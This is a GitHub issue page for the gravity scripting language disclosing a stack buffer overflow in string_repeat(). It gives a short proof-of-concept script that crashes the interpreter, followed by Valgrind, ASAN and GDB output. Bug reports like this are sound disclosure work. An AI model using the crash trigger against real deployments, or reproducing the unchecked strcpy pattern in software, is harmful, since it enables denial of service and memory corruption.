=== Content from github.com_afda30dc_20250125_134218.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarcobambini%2Fgravity%2Fissues%2F131)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarcobambini%2Fgravity%2Fissues%2F131)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=marcobambini%2Fgravity)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[marcobambini](/marcobambini)
/
**[gravity](/marcobambini/gravity)**
Public

* [Notifications](/login?return_to=%2Fmarcobambini%2Fgravity) You must be signed in to change notification settings
* [Fork
  231](/login?return_to=%2Fmarcobambini%2Fgravity)
* [Star
   4.3k](/login?return_to=%2Fmarcobambini%2Fgravity)

* [Code](/marcobambini/gravity)
* [Issues
  36](/marcobambini/gravity/issues)
* [Pull requests
  9](/marcobambini/gravity/pulls)
* [Discussions](/marcobambini/gravity/discussions)
* [Actions](/marcobambini/gravity/actions)
* [Projects
  0](/marcobambini/gravity/projects)
* [Wiki](/marcobambini/gravity/wiki)
* [Security](/marcobambini/gravity/security)
* [Insights](/marcobambini/gravity/pulse)

Additional navigation options

* [Code](/marcobambini/gravity)
* [Issues](/marcobambini/gravity/issues)
* [Pull requests](/marcobambini/gravity/pulls)
* [Discussions](/marcobambini/gravity/discussions)
* [Actions](/marcobambini/gravity/actions)
* [Projects](/marcobambini/gravity/projects)
* [Wiki](/marcobambini/gravity/wiki)
* [Security](/marcobambini/gravity/security)
* [Insights](/marcobambini/gravity/pulse)

# Stack Overflow (String.repeat() \ strcpy) #131

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Stack Overflow (String.repeat() \ strcpy)](#top)#131Copy link[![@r0t0tiller](https://avatars.githubusercontent.com/u/10905489?u=74c5dc9c89f73f869e9a6aadabadc873e3211077&v=4&size=80)](/r0t0tiller)
## Description

[![@r0t0tiller](https://avatars.githubusercontent.com/u/10905489?u=74c5dc9c89f73f869e9a6aadabadc873e3211077&v=4&size=48)](/r0t0tiller)[r0t0tiller](https://github.com/r0t0tiller)opened [on Apr 10, 2017](https://github.com/marcobambini/gravity/issues/131#issue-220791330)

There is a stack based buffer overflow in the string\_repeat() function in gravity\_core.c. Using the testcase below an attacker can overflow the integers of .repeat() as well, use the var to gain complete control of the program's memory. Attached is the Valgrind, ASAN, and GDB output. Would recommend not using strcpy or memcpy unless you can ensure that bounds are being checked on both the dest and src strings.

```
func main() {

var a = "AAAAAAAAAAAAAAAAAAAAAAAA";

a.repeat(100000000000000000);

return a;

}

```

Valgrind:

==3080== Memcheck, a memory error detector

==3080== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.

==3080== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info

==3080== Command: ./gravity /home/ctf/Desktop/string.gravity

==3080==

==3080== Warning: client switching stacks? SP change: 0xffeffe970 --> 0xf0f866958

==3080== to suppress, use: --max-stackframe=4017717272 or greater

==3080== Invalid write of size 8

==3080== at 0x42375D: string\_repeat (in /home/ctf/Desktop/Updated\_Gravity/gravity/gravity)

==3080== Address 0xf0f866958 is on thread 1's stack

==3080==

==3080==

==3080== Process terminating with default action of signal 11 (SIGSEGV)

==3080== Access not within mapped region at address 0xF0F866958

==3080== at 0x42375D: string\_repeat (in /home/ctf/Desktop/Updated\_Gravity/gravity/gravity)

==3080== If you believe this happened as a result of a stack

==3080== overflow in your program's main thread (unlikely but

==3080== possible), you can try to increase the size of the

==3080== main thread stack using the --main-stacksize= flag.

==3080== The main thread stack size used in this run was 8388608.

==3080== Invalid write of size 8

==3080== at 0x4A28680: \_vgnU\_freeres (in /usr/lib/valgrind/vgpreload\_core-amd64-linux.so)

==3080== Address 0xf0f866950 is on thread 1's stack

==3080==

==3080==

==3080== Process terminating with default action of signal 11 (SIGSEGV)

==3080== Access not within mapped region at address 0xF0F866950

==3080== at 0x4A28680: \_vgnU\_freeres (in /usr/lib/valgrind/vgpreload\_core-amd64-linux.so)

==3080== If you believe this happened as a result of a stack

==3080== overflow in your program's main thread (unlikely but

==3080== possible), you can try to increase the size of the

==3080== main thread stack using the --main-stacksize= flag.

==3080== The main thread stack size used in this run was 8388608.

==3080==

==3080== HEAP SUMMARY:

==3080== in use at exit: 74,372 bytes in 1,029 blocks

==3080== total heap usage: 1,078 allocs, 49 frees, 78,648 bytes allocated

==3080==

==3080== LEAK SUMMARY:

==3080== definitely lost: 264 bytes in 6 blocks

==3080== indirectly lost: 1,384 bytes in 17 blocks

==3080== possibly lost: 0 bytes in 0 blocks

==3080== still reachable: 72,724 bytes in 1,006 blocks

==3080== suppressed: 0 bytes in 0 blocks

==3080== Rerun with --leak-check=full to see details of leaked memory

==3080==

==3080== For counts of detected and suppressed errors, rerun with: -v

==3080== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 0 from 0)

Segmentation fault (core dumped)

ASAN:

# ASAN:SIGSEGV

==3033==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd0a2a5418 (pc 0x00000042375d bp 0x7ffd2201e880 sp 0x7ffd0a2a5420 T0)

#0 0x42375c in string\_repeat (/home/ctf/Desktop/Updated\_Gravity/gravity/gravity+0x42375c)

[#1](https://github.com/marcobambini/gravity/issues/1) 0x41bbcb in gravity\_vm\_exec (/home/ctf/Desktop/Updated\_Gravity/gravity/gravity+0x41bbcb)

[#2](https://github.com/marcobambini/gravity/pull/2) 0x41fc72 in gravity\_vm\_runmain (/home/ctf/Desktop/Updated\_Gravity/gravity/gravity+0x41fc72)

[#3](https://github.com/marcobambini/gravity/issues/3) 0x401777 in main (/home/ctf/Desktop/Updated\_Gravity/gravity/gravity+0x401777)

[#4](https://github.com/marcobambini/gravity/issues/4) 0x7f691a2a582f in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x2082f)

[#5](https://github.com/marcobambini/gravity/pull/5) 0x401988 in \_start (/home/ctf/Desktop/Updated\_Gravity/gravity/gravity+0x401988)

SUMMARY: AddressSanitizer: stack-overflow ??:0 string\_repeat

GDB:

[----------------------------------registers-----------------------------------]

RAX: 0xef798010

RBX: 0x0

RCX: 0xe8d4a51000

RDX: 0x2

RSI: 0x65d6e0 ('A' <repeats 15 times>...)

RDI: 0x7fff108649d0

RBP: 0x7fffffffda30 --> 0x6481d0 --> 0x64c610 --> 0x64a1d0 (0x000000000064a1d0)

RSP: 0x7fff108649d0

RIP: 0x42375d (<string\_repeat+317>: call 0x401180 strcpy@plt)

R8 : 0x4

R9 : 0x655d10 --> 0x64a570 --> 0x64a1d0 (0x000000000064a1d0)

R10: 0x64b050 --> 0x64a1d0 (0x000000000064a1d0)

R11: 0x40 ('@')

R12: 0x648010 --> 0x6497b0 --> 0x1100000100

R13: 0x2

R14: 0x7fff108649d0

R15: 0x65d550 --> 0x64c610 --> 0x64a1d0 (0x000000000064a1d0)

EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

0x423754 <string\_repeat+308>: sub rsp,rax

0x423757 <string\_repeat+311>: mov rdi,rsp

0x42375a <string\_repeat+314>: mov r14,rsp

=> 0x42375d <string\_repeat+317>: call 0x401180 strcpy@plt

0x423762 <string\_repeat+322>: mov rcx,QWORD PTR [rbp-0x1048]

0x423769 <string\_repeat+329>: lea rax,[rcx-0x1]

0x42376d <string\_repeat+333>: cmp rcx,0x1

0x423771 <string\_repeat+337>: mov QWORD PTR [rbp-0x1048],rax

Guessed arguments:

arg[0]: 0x7fff108649d0

arg[1]: 0x65d6e0 ('A' <repeats 15 times>...)

[------------------------------------stack-------------------------------------]

Invalid $SP address: 0x7fff108649d0

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Stopped reason: SIGSEGV

0x000000000042375d in string\_repeat ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

[─────────────────────────────────────────────────────────────REGISTERS─────────────────────────────────────────────────────────────]

\*RAX 0xef798010

RBX 0x0

\*RCX 0xe8d4a51000

\*RDX 0x2

\*RDI 0x7fff108649d0

\*RSI 0x65d6e0 ◂— 0x4141414141414141 ('AAAAAAAA')

\*R8 0x4

\*R9 0x655d10 —▸ 0x64a570 —▸ 0x64a1d0 ◂— 0x64a1d0

\*R10 0x64b050 —▸ 0x64a1d0 ◂— 0x64a1d0

\*R11 0x40

\*R12 0x648010 —▸ 0x6497b0 ◂— 0x1100000100

\*R13 0x2

\*R14 0x7fff108649d0

\*R15 0x65d550 —▸ 0x64c610 —▸ 0x64a1d0 ◂— 0x64a1d0

\*RBP 0x7fffffffda30 —▸ 0x6481d0 —▸ 0x64c610 —▸ 0x64a1d0 ◂— ...

\*RSP 0x7fff108649d0

\*RIP 0x42375d (string\_repeat+317) ◂— call 0x401180

[───────────────────────────────────────────────────────────────CODE────────────────────────────────────────────────────────────────]

► 0x42375d <string\_repeat+317> call strcpy@plt <0x401180>

dest: 0x7fff108649d0

src: 0x65d6e0 ◂— 0x4141414141414141 ('AAAAAAAA')

0x423762 <string\_repeat+322> mov rcx, qword ptr [rbp - 0x1048]

0x423769 <string\_repeat+329> lea rax, [rcx - 1]

0x42376d <string\_repeat+333> cmp rcx, 1

0x423771 <string\_repeat+337> mov qword ptr [rbp - 0x1048], rax

0x423778 <string\_repeat+344> je string\_repeat+377 <0x423799>

0x42377a <string\_repeat+346> nop word ptr [rax + rax]

0x423780 <string\_repeat+352> mov rsi, qword ptr [r15 + 0x18]

0x423784 <string\_repeat+356> mov rdi, r14

0x423787 <string\_repeat+359> add rbx, 1

0x42378b <string\_repeat+363> call strcat@plt <0x4013d0>

[───────────────────────────────────────────────────────────────STACK───────────────────────────────────────────────────────────────]

<Could not read memory at 0x7fff108649d0>

[─────────────────────────────────────────────────────────────BACKTRACE─────────────────────────────────────────────────────────────]

► f 0 42375d string\_repeat+317

f 1 41bbcc gravity\_vm\_exec+19772

f 2 41fc73 gravity\_vm\_runmain+243

f 3 401778 main+744

f 4 7ffff751d830 \_\_libc\_start\_main+240

Program received signal SIGSEGV (fault address 0x7fff108649c8)

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


